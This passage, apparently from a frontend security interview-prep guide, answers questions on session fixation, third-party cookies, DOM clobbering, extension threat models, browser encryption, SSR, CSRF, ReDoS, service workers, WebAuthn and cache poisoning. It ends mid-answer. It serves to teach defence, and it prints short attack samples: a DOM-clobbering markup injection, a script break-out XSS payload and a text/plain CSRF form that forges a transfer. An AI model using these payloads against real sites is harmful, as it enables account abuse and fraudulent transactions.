**(3) Verbose errors and internal metadata.** Stack traces, framework dev-mode warnings, and `console.log` of request/response objects can leak tokens, internal hostnames, and stack details — strip `console.*` from production builds, ensure `NODE_ENV=production`, and never echo raw server error bodies into the UI. The CI guardrails that make this durable: a secret-scan step over the built `dist/`, a check that no `*.map` files are deployed to the public origin (or that they're access-controlled), and a header/config audit confirming production mode. The throughline: treat the bundle as published source, and put the trust boundary — secrets, privileged calls, detailed errors — on the server side of it.

#### Q44. [Theory] Explain session fixation in the context of SPA/cookie auth, how it differs from session hijacking, and the canonical fix.

Session fixation and session hijacking both end with the attacker riding the victim's session, but they differ in *when* the attacker obtains the session identifier. In **hijacking**, the attacker steals an *already-authenticated* session token after the fact (via XSS, network sniffing, etc.). In **fixation**, the attacker **plants a known session ID before login** and tricks the victim into authenticating *under that pre-known ID*, so the attacker — who already knows the ID — is now inside the victim's authenticated session without ever stealing anything afterward.

```
FIXATION timeline:
  1. Attacker obtains/sets a session id S (e.g., gets one from the app, or injects
     it via a subdomain-scoped cookie or a URL ?sessionid=S that the app honors).
  2. Attacker lures victim to authenticate while the browser holds id S.
  3. App authenticates the victim but KEEPS the same session id S. <-- the bug
  4. Attacker, already knowing S, presents it and is logged in as the victim.
```

The vulnerability exists only if the application **fails to rotate the session identifier at the privilege boundary** — i.e., it reuses the pre-login session ID for the post-login authenticated session. The canonical fix is therefore simple and absolute: **regenerate the session ID upon any change in privilege level**, most importantly immediately after successful authentication (and again on logout, and ideally on privilege elevation/step-up). In Express that's `req.session.regenerate()`; most frameworks have an equivalent. Reinforcing controls: never accept a session ID from a URL parameter or any client-settable channel (only via a `Set-Cookie` you issued); set cookies `HttpOnly`/`Secure`/`SameSite` and use the `__Host-` prefix so a subdomain can't pre-seed a cookie (Q31); and bind sessions server-side. The interview-level distinction to articulate: hijacking is about *protecting the token's confidentiality*, while fixation is about *invalidating any pre-authentication identifier at the moment trust changes* — different root causes, different fixes.

#### Q45. [Practical] You're migrating an embedded widget that relies on third-party cookies, which browsers are now blocking. Walk through the options (CHIPS, Storage Access API, redesign).

Third-party cookie deprecation breaks any cross-site embedded experience that relied on a cookie set in a 3p `<iframe>` context — embedded checkout, SSO widgets, support chat, embedded dashboards. The migration depends on *why* the widget needs the cookie, and there are three viable paths plus a redesign.

```
Need                                   Solution                    Mechanism
-------------------------------------  --------------------------  --------------------------------
Per-embedding-site state, no cross-    CHIPS (Partitioned cookie)  Set-Cookie: ...; Secure;
site identity required                                             Partitioned   (one cookie jar
(e.g. iframe remembers UI prefs                                    PER top-level site; no cross-
on THIS host)                                                      site linkage)
Genuinely need the user's existing 3p  Storage Access API          iframe calls
session (e.g. logged-in SSO/chat)                                  document.requestStorageAccess()
                                                                   — user gesture + grant unlocks
                                                                   the unpartitioned cookie
Identity / token handoff               Redesign: token via         postMessage / OAuth redirect /
                                       message channel or 1p BFF   first-party BFF on the embedder
```

**CHIPS (`Partitioned` cookies)** is the right tool when the widget only needs its *own* state scoped to the current embedding site — the cookie still works in the 3p iframe, but the browser keeps a **separate cookie jar per top-level site**, so it can't be used for cross-site tracking. This covers most "remember settings for this embed" cases with a one-line `Set-Cookie` change. **The Storage Access API** is for the harder case where the widget genuinely needs the user's *unpartitioned* third-party session (e.g., an embedded SSO that must recognize an already-logged-in user) — the iframe must call `document.requestStorageAccess()` from a user gesture, and the browser may prompt/grant access; it requires the user to have a first-party relationship with the 3p origin. **The most robust long-term fix is architectural**: stop depending on ambient 3p cookies and instead pass identity/state explicitly — a `postMessage` token handshake (origin-validated, Q21), an OAuth redirect to establish a first-party session, or moving the integration behind a **first-party BFF** on the embedder's own domain so the cookie is first-party again. My recommendation order: prefer the redesign for anything security-sensitive (it removes the dependency entirely), use Storage Access only when you truly need the existing 3p session, and use CHIPS for benign per-site widget state. Crucially, none of these are an excuse to weaken `SameSite` — `SameSite=None; Secure; Partitioned` is the modern shape for a legitimately-cross-site cookie.

#### Q46. [Theory] What is DOM clobbering, how does it bypass JS-only security logic, and how do you defend against it?

DOM clobbering is a code-less injection technique: an attacker who can inject *non-script* HTML (e.g., through a sanitizer that allows `id`/`name` attributes and tags like `<a>`, `<form>`, `<img>` — which most HTML sanitizers do, since they're "harmless") can **overwrite JavaScript variables and properties via named DOM elements**. The browser auto-creates global references for elements with `id`/`name` attributes (the legacy "named access on the `window` object" and `document` behavior), so injected markup can shadow a property your security code relies on — *without any script executing at all*, which is why it slips past CSP and script-blocking sanitizers.

```html
<!-- Attacker injects this benign-looking markup (no <script>, passes sanitizer): -->
<a id="config"></a>
<a id="config" name="isAdmin" href="cid:true"></a>

<!-- Now in app JS: -->
<script>
  // Expected: window.config is a JS object the app defined.
  // Clobbered: window.config now resolves to the injected <a> element/collection,
  // and window.config.isAdmin is the second anchor — truthy where code expected false.
  if (window.config && window.config.isAdmin) grantAccess(); // ☠️ bypassed
</script>
```

The danger is that clobbering targets the **assumptions of otherwise-safe JS** — guards that check `window.someFlag`, `document.someForm`, or a config object's presence can be flipped or made truthy by injected elements, enabling auth-logic bypass, open redirect (clobbering a URL variable), or escalation into XSS when the clobbered value feeds a sink. Defenses: (1) **don't read globals/`document` properties for security decisions** — use module-scoped variables, `const`, and closures that injected DOM can't reach; (2) explicitly check types before trusting a value (`typeof config === 'object' && config instanceof MyConfig`, or that a property is your expected primitive, not an `HTMLElement`); (3) configure your sanitizer to strip or namespace `id`/`name` attributes on untrusted HTML (DOMPurify has `SANITIZE_DOM`/`SANITIZE_NAMED_PROPS` options for exactly this); and (4) avoid `name`/`id` collisions with security-relevant identifiers. The expert framing: DOM clobbering proves that "no script executed" is not the same as "safe" — markup alone can corrupt the JS runtime's namespace, so script-blocking controls (CSP) must be paired with sanitizer hardening and not reading the DOM as a source of trusted state.

### 🔴 Expert — extended

#### Q47. [Theory] Design the threat model and trust boundaries for a browser extension that injects a content script into arbitrary pages. What's unique versus a normal web app?

A browser extension content script is uniquely dangerous because it runs **inside the page's DOM with elevated extension privileges**, straddling two distinct trust domains — the (potentially hostile) web page and the extension's privileged background/service-worker context. The threat model has boundaries a normal web app never faces:

```
   Hostile web page (untrusted)         Content script (your code, page DOM)        Extension SW (privileged)
   ----------------------------         ------------------------------------        -------------------------
   - can run arbitrary JS               - SHARES the page's DOM/window               - holds extension APIs
   - can try to clobber/spoof the       - "isolated world": separate JS heap          (storage, tabs, network,
     objects the content script reads     from the page, BUT same DOM                  host permissions)
   - can phish the content script via   - bridges page <-> privileged SW             - must NEVER trust messages
     the DOM and postMessage              <-- THE critical boundary                    from content scripts blindly
```

The unique risks and their controls: **(1) The isolated world is not a security sandbox for the DOM.** Manifest V3 gives the content script a separate JS execution context (the page can't call your functions or read your variables), but you *share the same DOM* — so the page can spoof elements, clobber globals (Q46), and feed you malicious data through the DOM. Treat everything read from the page as untrusted input. **(2) The content-script ↔ background-SW channel is the keystone boundary** — the SW holds the dangerous capabilities (cross-origin `fetch` with the user's cookies, `chrome.tabs`, storage of all sites' data), so it must validate every message, expose only a minimal capability-style API, and never reflect page-controlled data into privileged actions. **(3) Least privilege in the manifest** — request the narrowest `host_permissions` (specific sites, or `activeTab` instead of `<all_urls>`), minimal permissions, and an extension CSP that forbids remote code (`'unsafe-eval'` is banned in MV3, which is the point). **(4) Never inject page-controlled data into the page via `innerHTML`** from the content script — you'd be creating XSS *with* your extension's trust. **(5) Beware supply chain** — an extension auto-updates with high privilege across every site the user visits, so a compromised dependency or a sold/hijacked extension is catastrophic (real incidents abound); pin and audit dependencies, and minimize them. The expert summary: a content script's threat model inverts the usual one — *the page is the attacker and your own privileged context is the asset to protect*, so the hardest engineering is the message-passing trust boundary between the page-facing content script and the capability-holding background worker.

#### Q48. [Practical] Architect end-to-end encryption for a web app (e.g., encrypted notes) using the Web Crypto API. What are the hard problems unique to doing crypto in a browser?

True end-to-end encryption (E2EE) in the browser means the server stores only ciphertext and never sees plaintext or keys — the client encrypts before upload and decrypts after download. The Web Crypto API (`crypto.subtle`) provides the primitives, and the cardinal rule is **use it, never hand-roll crypto in JS**. A workable architecture:

```javascript
// Derive a symmetric key from the user's passphrase (PBKDF2 -> AES-GCM key).
async function deriveKey(passphrase, salt) {
  const baseKey = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(passphrase), 'PBKDF2', false, ['deriveKey']);
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, iterations: 600_000, hash: 'SHA-256' },
    baseKey, { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt']);
}

async function encryptNote(plaintext, key) {
  const iv = crypto.getRandomValues(new Uint8Array(12));       // unique IV per message
  const ct = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv }, key, new TextEncoder().encode(plaintext));
  return { iv, ct };   // store/transmit both; AES-GCM provides integrity too
}
```

The hard problems are not the algorithms — they're the **browser environment's structural weaknesses**, which is the senior insight the question is probing:

- **Key storage.** Where do keys live between sessions? `localStorage` is XSS-readable (defeating E2EE), so use **non-extractable `CryptoKey` objects** (`extractable: false`) persisted in **IndexedDB** — the browser stores the key material opaquely and JS can use it to encrypt/decrypt but cannot export the bytes, so even an XSS can't exfiltrate the raw key (though it could still *use* it while the page is open). For passphrase-derived keys, don't store the key at all — re-derive from a passphrase entered each session.
- **Code-delivery trust (the fundamental flaw).** The server delivers the very JavaScript that performs the encryption, so a malicious or compromised server can ship code that quietly leaks plaintext or the key — undermining the E2EE guarantee. This is the well-known "you can't trust crypto delivered by the entity you're hiding from" problem. Mitigations are partial: strict CSP + SRI to pin code, code transparency/signed releases, and ideally moving the crypto into an **auditable, signed extension or native app** rather than ephemeral page JS.
- **XSS is fatal to E2EE.** Any XSS can read decrypted plaintext from the DOM and exfiltrate it while the page is live, regardless of how well keys are protected — so a hardened CSP/Trusted Types posture is a *prerequisite*, not an add-on.
- **Key exchange & multi-device** (sharing a note, a new device) requires asymmetric crypto (ECDH/RSA-OAEP via Web Crypto) and a way to verify the other party's public key without a trusted server — the same key-distribution problem all E2EE faces.

The honest expert conclusion: Web Crypto makes the *primitives* safe and constant-time, but browser E2EE's trust ceiling is set by **code delivery and XSS**, so the architecture must lean on non-extractable keys, pinned/signed code, and a maximally strict CSP — and you should be candid that page-delivered web E2EE is weaker than a signed native/extension client for truly adversarial threat models.

#### Q49. [Theory] How do you reason about the security implications of speculative/streaming SSR, React Server Components, and hydration? Where do new XSS and data-leak risks appear?

Modern server-driven rendering (streaming SSR, React Server Components/RSC, islands/partial hydration) reshapes the XSS and data-exposure attack surface because the **trust boundary between server and client moves**, and serialized state crosses it in new ways. Three risk areas matter at staff level.

**(1) Serialized state injection (the hydration payload).** SSR frameworks embed initial state into the HTML so the client can hydrate — historically `window.__INITIAL_STATE__ = {...}` inside an inline `<script>`. If that serialization isn't done safely, an attacker-controlled value in the state (a username, a query) can break out of the JSON/script context: the classic break-out is a payload containing `</script>` which closes the inline script tag early and begins arbitrary markup. The fix is context-aware serialization — escape `<`, `>`, `&`, line separators, and especially `/` in `</script>` (libraries like `serialize-javascript` or framework-native serializers do this), or deliver state via a `<script type="application/json">` block that's parsed rather than executed. This is an XSS sink that *looks* like data handling, so it's easily missed.

```
   Server renders HTML  ──►  inline <script>window.__STATE__ = {"q":"<USER INPUT>"}</script>
                                                                    │
                              if USER INPUT = </script><img src=x onerror=...>
                                                                    ▼
                              the inline script closes early → injected markup executes (XSS)
```

**(2) Over-serialization / data leakage across the server→client boundary.** RSC and SSR make it dangerously easy to pass a server object (a full user record, an ORM model, secrets attached to a session) into a client component's props, where it gets **serialized into the HTML payload visible to anyone**. The discipline: server components must pass only the *minimal, intended* fields across the boundary, and you should lint/type the props that cross into client components. A leaked `passwordHash` or internal flag in the hydration JSON is a real and common class of bug in RSC apps.

**(3) Hydration mismatches and dangerous-HTML during streaming.** Streaming sends HTML in chunks before hydration completes, and `dangerouslySetInnerHTML`/`v-html` rendered server-side ships raw to the client before any client-side guard runs — so server-side sanitization (DOMPurify on the server, or a server-side Trusted Types-equivalent policy) is mandatory; you cannot rely on a client effect to clean it up after paint. Additionally, per-request data baked into a *streamed/cached* response risks **cross-user contamination** if a CDN or framework cache layer caches a personalized fragment — so mark personalized SSR responses no-cache/private and scope nonces per response.

The unifying expert framing: server-driven rendering relocates rendering (and therefore the XSS sink and the state serialization) onto the server and the wire, so the defenses shift too — **escape what you serialize into HTML, minimize what crosses the server/client boundary, sanitize dangerous HTML server-side, and ensure per-response nonces/caching don't leak across users.** It's the same principles (context-aware encoding, least exposure, defense in depth) applied at a boundary many frontend engineers haven't had to threat-model before.

#### Q50. [Practical] You own frontend security org-wide. Design the metrics, guardrails, and review gates that keep a 200-engineer org secure without becoming a bottleneck.

At org scale the goal shifts from "find bugs" to **making insecure code structurally hard to write and easy to detect**, so that the small security team is a force-multiplier rather than a manual review queue. I design this as paved-road defaults, automated gates, targeted human review, and measurable feedback loops.

**Paved-road defaults (prevent by construction).** The highest-leverage move is shipping secure defaults in shared infrastructure so individual teams can't easily get it wrong: a shared component library that escapes by default and has no raw-`innerHTML` escape hatch without a sanitizer; a platform-level CSP (nonce + `strict-dynamic`) and security headers applied at the edge/gateway for all apps; an auth SDK that implements the in-memory-token + HttpOnly-refresh / BFF pattern so teams don't hand-roll token storage; and a vetted, auto-updated sanitizer (DOMPurify) as the only sanctioned path. Most vulnerabilities are *not* written by malice but by teams reinventing a primitive — paved roads remove that opportunity.

**Automated gates in CI (catch what slips, no human in the loop).** As in Q29 but enforced org-wide: lint rules for dangerous sinks blocking merge; dependency/SBOM scanning gating on severity; secret scanning over source *and built bundles* (Q43); automated header/CSP assertions in integration tests; and SRI verification. The principle: anything a tool can decide should never reach a human reviewer.

```
Layer            Control                                Gate type
---------------  -------------------------------------  -----------------------
Construction     secure component lib, auth SDK, edge   default (can't opt out
                 CSP/headers                            without an exception)
CI automated     sink lint, dep/secret scan, header     blocking merge check
                 assertions, SRI
Human review     new trust boundary / new 3p / auth     security-team gate via
                 change / crypto / new origin           risk-tagged PR labels
Runtime          CSP report-to telemetry, anomaly       monitoring + alerting
                 detection, bug bounty
```

**Targeted human review (scarce attention on genuine novelty).** Security engineers should review only what tools can't reason about: new trust boundaries, new third-party scripts/origins, auth/authz changes, and any crypto — triggered automatically by CODEOWNERS/path rules and PR risk-labels, not by reviewing every diff. Pair this with **security champions** embedded per team to handle routine questions locally.

**Metrics and feedback loops (prove it's working, find the gaps).** I track leading and lagging indicators: mean time to remediate by severity; % of services on the paved-road CSP/auth SDK (coverage); dependency-vuln age/exposure window; CSP `report-to` violation trends (a live early-warning of both bugs and attacks); escaped-defect rate from pentests/bug-bounty mapped back to *which gate should have caught it*; and training/champion coverage. Crucially, every incident and every bug-bounty finding feeds back into a *new automated gate or a paved-road change* (Q25's principle at org scale) — the success metric isn't "bugs found" but "classes of bug that became impossible or auto-caught." The anti-bottleneck design principle throughout: **shift work left and down** — into defaults teams inherit and gates that run without security staff — so the central team's limited human attention is spent only on novel risk, and security scales with engineering headcount instead of becoming a serializing checkpoint.

### 🟢 Basic — extended

#### Q51. [Theory] What does `X-Content-Type-Options: nosniff` do, and what attack does MIME sniffing enable?

`X-Content-Type-Options: nosniff` tells the browser to **trust the server's declared `Content-Type` and never guess (sniff) it** from the response body. Historically, browsers tried to be helpful: if a server sent a file as `text/plain` but the bytes looked like HTML, the browser would "sniff" and render it as HTML anyway. That helpfulness is a vulnerability, because it lets a file the developer believed was inert be reinterpreted as executable content.

```
Without nosniff:
  User uploads "avatar.jpg" that actually contains <script>...</script>
  Server serves it as image/jpeg (or text/plain)
  Browser sniffs the bytes, decides "this looks like HTML", renders it
  -> the injected script runs in YOUR origin = stored XSS

With nosniff:
  Browser honors image/jpeg, refuses to execute it as HTML/JS -> attack blocked
```

The two concrete protections: **(1) XSS via uploaded/user-controlled files** — a user-supplied file served from your origin can't be coerced into running as a script if the browser respects the declared type. **(2) Script/stylesheet confusion** — `nosniff` also makes the browser refuse to load a resource as a script unless its MIME type is a valid JavaScript type, blocking some content-confusion attacks. It's a one-line, no-downside header (`X-Content-Type-Options: nosniff`) that should be set globally alongside HSTS and the framing headers. The deeper lesson it teaches juniors: the `Content-Type` you serve is a *security-relevant* assertion, not cosmetic metadata — serve user content with the correct, restrictive type (and ideally from a separate sandbox origin, per Q27), and set `nosniff` so the browser can't override you.

#### Q52. [Practical] A form collects passwords and card numbers. What HTML-level and browser-level controls reduce exposure of these fields?

Even before the data reaches your server, the *browser surface* of sensitive fields leaks in ways teams overlook — through caching, autofill, address-bar history, accessibility trees, and accidental logging. There's a stack of cheap, declarative controls:

```html
<!-- Password: don't let the browser/page cache or mis-autofill it -->
<input type="password" name="password" autocomplete="current-password"
       autocapitalize="off" autocorrect="off" spellcheck="false">

<!-- New password during signup: hints the password manager, avoids reuse -->
<input type="password" autocomplete="new-password">

<!-- Card number: tokenize via a PCI iframe (Stripe Elements etc.), but if native: -->
<input inputmode="numeric" autocomplete="cc-number" name="cc">
```

Key controls and why: **(1) `autocomplete` hints** (`current-password`, `new-password`, `cc-number`) help password managers and *prevent* the browser from autofilling a credit-card field with a saved address or a password field with the wrong value — and `new-password` nudges managers to suggest a strong unique password. **(2) Never put sensitive data in a URL/query string** — it lands in browser history, server logs, `Referer` headers, and analytics; always POST. **(3) Set `Cache-Control: no-store` on responses containing sensitive data** so a shared/back-button cache doesn't retain it. **(4) For payment data, don't touch it at all if you can avoid it** — embed the PCI provider's iframe (Stripe Elements, Braintree Hosted Fields) so the card number never enters your DOM or origin, slashing your PCI scope and attack surface. **(5) Disable on-screen leakage** — avoid logging form objects (Q43), keep field values out of error reports, and be mindful that `value` attributes and React dev-tools state can expose them. The framing for the interview: sensitive form fields have a *client-side* exposure surface (autofill, cache, URL, history, logs) that exists independently of transport security, and the mitigations are mostly free, declarative HTML/header settings — but the strongest control for the highest-value data (cards) is *not handling it in your origin at all*.

### 🟡 Intermediate — extended

#### Q53. [Practical] Your `/api` endpoints accept JSON and use cookie auth. Are they CSRF-safe by default, and how does the `Content-Type: application/json` "protection" fail?

A common belief is that JSON APIs are automatically CSRF-immune because "you can't send `application/json` from a cross-site HTML form." That's *partly* true and dangerously incomplete. A classic HTML `<form>` can only send `Content-Type` values of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` — none of which is `application/json` — and a cross-site `fetch` with `Content-Type: application/json` triggers a **CORS preflight** that your server can refuse. So *if* your endpoint strictly requires `application/json` and rejects everything else, the simple form-based CSRF is blocked. But there are real holes:

```javascript
// The "text/plain smuggling" bypass: a cross-site form CAN send text/plain,
// and the body can be crafted to be VALID JSON the server happily parses.
// evil.com auto-submits:
//   <form action="https://api.example.com/transfer" method="POST"
//         enctype="text/plain">
//     <input name='{"to":"attacker","amount":10000,"x":"' value='"}'>
//   </form>
// Body on the wire: {"to":"attacker","amount":10000,"x":"="}   <-- parses as JSON!
```

The failure modes: **(1)** if the server parses any body as JSON regardless of `Content-Type` (many lenient parsers do), the `text/plain` smuggling above sends attacker-controlled JSON with the cookie attached and **no preflight** (because `text/plain` is a "simple" request). **(2)** if the endpoint also accepts form-encoded bodies for convenience, the simple-form attack works directly. **(3)** GET endpoints that mutate state are trivially CSRF-able regardless of content type. The robust answer is to **not rely on content-type as a CSRF control**: enforce `SameSite=Lax` on the auth cookie (the real baseline defense), strictly reject any request whose `Content-Type` isn't exactly `application/json` *and* validate `Sec-Fetch-Site: same-origin`/`Origin`, and add a CSRF token or use `Authorization: Bearer` (header-based, not auto-sent) for the API. Content-type checking is a thin, bypassable layer — useful only as one part of a layered defense, never the whole of it.

#### Q54. [Theory] What is ReDoS (Regular-expression Denial of Service), how does it hit the frontend, and how do you find and fix vulnerable patterns?

ReDoS is a denial-of-service caused by a regular expression whose worst-case matching time is *exponential* (or high-polynomial) in the input length, so a relatively short malicious string can hang the regex engine for seconds or minutes — freezing the thread that runs it. It stems from **catastrophic backtracking**: patterns with nested or overlapping quantifiers (`(a+)+`, `(a|a)*`, `(.*)*`) force the backtracking engine to explore an explosion of ways to match the same input before giving up.

```javascript
// ❌ vulnerable: nested quantifier -> exponential backtracking
const re = /^(\w+\s?)*$/;            // or email/URL regexes copied off the internet
re.test('aaaaaaaaaaaaaaaaaaaaaaaa!'); // a long run of 'a' + a non-match tail = hang

// On the FRONTEND this matters because JS is single-threaded:
//  - a ReDoS in input validation freezes the entire UI/tab (the event loop blocks)
//  - if the same regex runs in a Node SSR/API layer, ONE request pins a CPU core
//    and a handful of requests take the whole service down
```

On the frontend the impact is twofold: client-side it **freezes the UI thread** (the page becomes unresponsive — a self-inflicted DoS on form validation), and in any Node/SSR layer it **blocks the event loop**, so a few crafted requests starve all other users. The fixes: **(1)** avoid nested/ambiguous quantifiers — rewrite to linear patterns, anchor properly, and prefer specific character classes over `.*`; **(2)** prefer non-regex parsing for structured input (use `new URL()` for URLs, a real email-validation library, `Number()`/`JSON.parse` for numbers) — most ReDoS comes from hand-rolled "validation" regexes; **(3)** scan your codebase and dependencies with tooling (`eslint-plugin-regexp`, `redos-detector`, CodeQL) since vulnerable regexes hide in transitive npm packages too; **(4)** as a backstop, cap input length before matching and/or run untrusted-input regexes on a timeout/worker or use a linear-time engine (RE2). The senior insight: regex looks innocuous but is a Turing-tarpit performance footgun — treat regexes that touch untrusted input as a potential DoS sink and validate them the same way you'd review an `innerHTML` assignment for XSS.

#### Q55. [Practical] A service worker is caching API responses, including authenticated ones. What are the security risks and how do you scope it correctly?

A service worker is a programmable proxy sitting between your app and the network, with the power to intercept every request and serve cached responses — which makes a misconfigured one a persistent, hard-to-evict security liability. The headline risks when it caches authenticated content:

```javascript
// ❌ caches EVERYTHING, including per-user authenticated responses
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.open('v1').then(c =>
      c.match(e.request).then(hit => hit || fetch(e.request).then(res => {
        c.put(e.request, res.clone());  // stores authed JSON in a shared cache
        return res;
      }))));
});
```

The dangers: **(1) Cross-user data leakage on shared devices** — the Cache Storage persists across logins; user B on the same browser can be served user A's cached private data (and the cache survives logout unless you explicitly purge it). **(2) Stale authorization** — a cached response reflects permissions at cache time; a user whose access was revoked may keep seeing cached privileged data. **(3) Persistence of the worker itself** — a service worker installed during an XSS (or shipped buggy) keeps running and intercepting for its scope even after the page closes, and a malicious SW can rewrite responses or exfiltrate requests; it's evicted only by an update or unregister, so it amplifies the blast radius of any compromise. **(4) Scope creep** — a SW registered at `/` controls the whole origin. The correct scoping: **never cache authenticated/per-user API responses with a cache-first strategy** — use network-first or don't cache them at all; cache only static, public assets (the app shell, images, fonts). Honor `Cache-Control: no-store`/`private` from the server. **Purge user-specific caches on logout** (`caches.delete(...)`) and version cache names so deploys evict old data. Serve the SW only over HTTPS (enforced), keep its registration scope minimal, and ensure a strong CSP/Trusted Types posture so an XSS can't register a rogue worker in the first place. The framing: a service worker turns transient page-level decisions into *origin-level, persistent* ones, so caching auth-sensitive data there converts a momentary response into a durable cross-session leak.

### 🟠 Advanced — extended

#### Q56. [Theory] Explain `Permissions-Policy` (formerly Feature-Policy) and `Referrer-Policy`. What does each defend, and what are sensible production values?

These two response headers control *capabilities* and *information disclosure* respectively, and both are cheap, high-value hardening that teams often forget. **`Permissions-Policy`** lets you allow or deny powerful browser features — camera, microphone, geolocation, payment, USB, accelerometer, fullscreen — for your own document *and, crucially, for embedded iframes*. The security value is twofold: it reduces your attack surface (a feature you never use can't be abused via an XSS), and it lets you strip dangerous capabilities from third-party iframes so an embedded widget can't silently request the camera or read geolocation.

```
# Deny powerful features outright; allow only what the app uses, scoped to self.
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(),
                    usb=(), accelerometer=(), fullscreen=(self)
# An iframe inherits ()=deny unless you explicitly delegate, e.g. allow="camera"
```

**`Referrer-Policy`** controls how much of the current URL is sent in the `Referer` header on outbound navigations and sub-resource requests. This matters because URLs frequently contain sensitive data — session tokens, password-reset tokens, internal path structure, user IDs — and a permissive policy leaks them to third-party domains (analytics, ad networks, any link the user clicks). The sensible production default is **`strict-origin-when-cross-origin`** (now the browser default): send the full URL only to the *same origin*, send just the origin (scheme+host, no path/query) to other HTTPS origins, and send nothing when downgrading HTTPS→HTTP. For highly sensitive apps use `no-referrer` or `same-origin` to leak even less.

```
Referrer-Policy: strict-origin-when-cross-origin   # good default for most apps
Referrer-Policy: no-referrer                        # max privacy; breaks some analytics
```

The combined production posture: set `Permissions-Policy` to deny every feature you don't use (`feature=()`) and delegate the few you do narrowly to `self`/specific origins, and set `Referrer-Policy` to at least `strict-origin-when-cross-origin` so URL-embedded secrets and internal structure don't leak cross-origin. Both belong in the same global edge/gateway header set as HSTS, CSP, `frame-ancestors`, and `nosniff` — collectively the "security headers baseline" a senior engineer expects every app to ship.

#### Q57. [Practical] Design the frontend integration for WebAuthn/passkeys. What attacks does it eliminate versus passwords, and what frontend pitfalls remain?

WebAuthn (passkeys) replaces shared-secret passwords with **public-key credentials**: the authenticator (platform TPM/Secure Enclave or a roaming security key) holds a private key; the server stores only the public key; authentication is a signed challenge. The frontend uses `navigator.credentials` for two ceremonies — registration (`create`) and authentication (`get`):

```javascript
// Registration: server sends a random challenge + rp/user info
const cred = await navigator.credentials.create({
  publicKey: {
    challenge,                         // fresh server-generated random bytes
    rp: { id: 'example.com', name: 'Example' },
    user: { id, name, displayName },
    pubKeyCredParams: [{ type: 'public-key', alg: -7 }], // ES256
    authenticatorSelection: { userVerification: 'required', residentKey: 'required' },
  },
});
// Send cred (attestation) to server to register the public key.

// Authentication: server sends a challenge; authenticator signs it
const assertion = await navigator.credentials.get({
  publicKey: { challenge, rpId: 'example.com', userVerification: 'required' },
});
// Server verifies the signature against the stored public key + checks origin/challenge.
```

**Attacks it eliminates versus passwords:** **(1) Phishing** — the credential is *bound to the origin* (`rpId`); the browser will only release/sign for the matching origin, so a phishing site at `examp1e.com` simply can't trigger the real credential. This is the killer feature: passkeys are inherently phishing-resistant. **(2) Credential stuffing & database breach** — there's no shared secret on the server to steal or reuse; the stored public key is useless to an attacker. **(3) Server-side password leaks and reuse** disappear entirely. **(4) Many MITM/replay attacks**, because each assertion signs a fresh server challenge.

**Frontend pitfalls that remain:** the server **must** still verify the signature, the challenge (fresh, single-use), the `origin`, and the `rpId` — the browser ceremony is not self-validating, and skipping server verification is a total bypass. The `rpId` must be set correctly (the registrable domain), or passkeys break across subdomains or, worse, are scoped too broadly. You must design **account-recovery and fallback** carefully — a lost authenticator can't be "reset" like a password, so recovery flows (a second passkey, recovery codes) are where security regressions sneak back in (a weak email-based recovery reintroduces phishing). Handle **feature detection and progressive enhancement** (`window.PublicKeyCredential`), and beware that synced passkeys (iCloud/Google) move the trust to the platform account's security. Finally, XSS still matters: an XSS can't steal the private key, but it can trigger a `get()` while the user is present or hijack the session post-auth — so passkeys raise the floor dramatically but don't excuse a weak CSP. The expert framing: WebAuthn moves authentication from a *shared secret* model to an *origin-bound asymmetric* model, eliminating the entire phishing/stuffing/breach-reuse class — but the security now lives in correct *server-side* verification and recovery design, which is exactly where teams reintroduce the holes they thought they'd closed.

#### Q58. [Practical] In production you must verify your security headers and CSP are actually applied and effective across a large fleet. How do you build that assurance?

Setting headers in code is not the same as them being *present, correct, and effective* in production — CDNs strip them, a misordered middleware drops them on error pages, a new route bypasses the gateway, or a permissive directive silently neutralizes the policy. Assurance requires *continuous external verification*, not a one-time check. My layered program:

```
Stage            Mechanism                                 Catches
---------------  ----------------------------------------  --------------------------------
CI (pre-deploy)  integration test asserts exact headers    missing/weak headers before ship;
                 on representative routes (incl. error,    regressions from a refactor
                 redirect, API, static)
Synthetic prod   scheduled scanner hits prod URLs, checks  CDN/edge stripping; route-specific
monitoring       header presence + parses CSP strictness   gaps; config drift
External grade   securityheaders.com / Mozilla Observatory periodic objective scoring +
                 / csp-evaluator (Google)                  CSP bypass detection
Runtime signal   CSP report-to / report-uri telemetry      policy too strict (breakage) OR
                                                            an actual injection attempt live
```

The pillars: **(1) Assert headers in CI integration tests** against *representative* responses — and specifically include the easy-to-miss ones: 4xx/5xx error pages, redirects, API JSON responses, and static assets, because middleware ordering bugs frequently drop headers on exactly those paths. **(2) Synthetic external monitoring** — a scheduled job that fetches real production URLs from outside your network and verifies headers survived the CDN/edge, alerting on drift; this is the only thing that catches a CDN or WAF silently rewriting responses. **(3) Objective scoring tools** — periodically run `securityheaders.com`, Mozilla Observatory, and especially **Google's CSP Evaluator**, which detects whether your CSP is *actually effective* or trivially bypassable (e.g., flags `'unsafe-inline'`, overly broad allowlists, missing `object-src`/`base-uri`). **(4) CSP `report-to` telemetry as the live signal** — a spike in violation reports means either a deploy broke a legitimate resource (regression) or someone is probing/exploiting an injection (attack), so it doubles as monitoring and an IDS. For a large fleet, the key is treating "is the header present and strict everywhere?" as a **continuously-tested invariant** with dashboards and alerts — config that isn't externally verified will drift, and the failure mode (a security control silently absent) is invisible until it's exploited. I'd also enforce headers at a single chokepoint (edge/gateway) rather than per-app so coverage is structural, then verify that chokepoint externally.

### 🔴 Expert — extended

#### Q59. [Theory] Web cache poisoning and cache deception against frontends: how do these attacks work, and how do you architect caching to be safe?

CDN/edge caching is essential for frontend performance but introduces two dangerous, related attack classes that turn a *shared* cache into an XSS-delivery or data-disclosure mechanism. **Web cache poisoning** abuses unkeyed inputs: a CDN caches a response keyed on (typically) method + URL, but the *response* may vary based on inputs the cache **ignores in its key** — an unkeyed header (`X-Forwarded-Host`, `X-Forwarded-Scheme`), a quirky query parameter, or a header the origin reflects into the body. An attacker sends a request that makes the origin emit a malicious response (e.g., reflecting an attacker-controlled `X-Forwarded-Host` into a `<script src>` or a redirect), the CDN caches it under the *normal* URL, and then **serves that poisoned response to every subsequent visitor** — a stored-XSS-grade impact delivered via the cache.

```
Cache poisoning (unkeyed header reflected, then cached):
